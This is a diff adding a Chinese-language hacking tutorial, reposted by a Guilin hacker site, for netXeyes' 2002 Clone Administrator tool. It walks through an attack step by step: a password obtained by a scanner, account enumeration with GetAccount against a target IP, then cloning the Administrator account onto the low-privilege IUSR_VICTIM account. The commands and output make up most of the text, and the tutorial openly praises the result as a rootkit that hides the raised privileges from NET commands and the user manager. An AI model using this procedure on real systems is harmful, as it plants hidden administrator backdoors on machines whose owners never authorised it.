@@ -1,0 +1,71 @@
+CA(Clone Administrator),即克隆管理员的意思。
+
+
+检查由CA克隆的帐号.
+
+C:\>cca \\211.161.45.203 guest ""
+
+Check Clone Account, by netXeyes 2002/04/29
+Written by netXeyes 2002, dansnow@21cn.com
+
+Connect 211.161.45.203 ....OK
+Prepairing ....OK
+Processing ....OK
+Checking ....
+
+Check Result:
+
+[Guest] AS SAME AS [Administrator]
+
+Clean Up ....OK 
+
+**********************************************
+
+利用这个工具可以将Administrator的帐号克隆为一个指定的普通帐号（此普通帐号必须已经存在）。克隆得到的帐号具有和系统内置的Administrator同样的设置，并且用NET命令或者用户管理器也发现不了其权限已经被提升，是一个不错的ROOT KIT.
+
+用一个例子说明用法：
+
+1、假定我们通过扫描器获得了192.168.0.1上用户test的密码为test（属于administrators组）.
+
+2、利用GetAccount（http://www.netXeyes.com/GetAccount.exe)获得系统中已经存在的帐号信息（当然利用空连接也可以）。
+
+C:\>getaccount \\192.168.0.1 1
+
+GetAccount Via SID, by netXeyes 2002/04/06
+
+Connect Host 192.168.0.1 ....OK
+
+Start Ememurate Account....
+
+Name is: TsInternetUser
+Name is: NetShowServices
+Name is: NetShow Administrators
+Name is: IUSR_VICTIM
+Name is: IWAM_VICTIM
+Name is: zjf
+Name is: DHCP Users
+Name is: DHCP Administrators
+
+Disconnect Host 192.168.0.1 ....OK 
+
+3、利用CA.exe 将Iusr_victim克隆为Administrator。
+
+C:\>ca \\192.168.0.1 test test iusr_victim password
+Clone Administrator, by netXeyes 2002/04/06
+Written by netXeyes 2002, dansnow@21cn.com
+
+Connect 192.168.0.1 ....OK
+Get SID of iusr_victim ....OK
+Prepairing ....OK
+Processing ....OK
+Clean Up ....OK
+
+C:\> 
+
+这时，iusr_victim就成为了超级用户，并有具有和Administrator同样的设置(桌面、菜单等等）。
+
+
+桂林老兵网  桂林老兵整理
+www.gxgl.com   www.gxgl.net
+
+
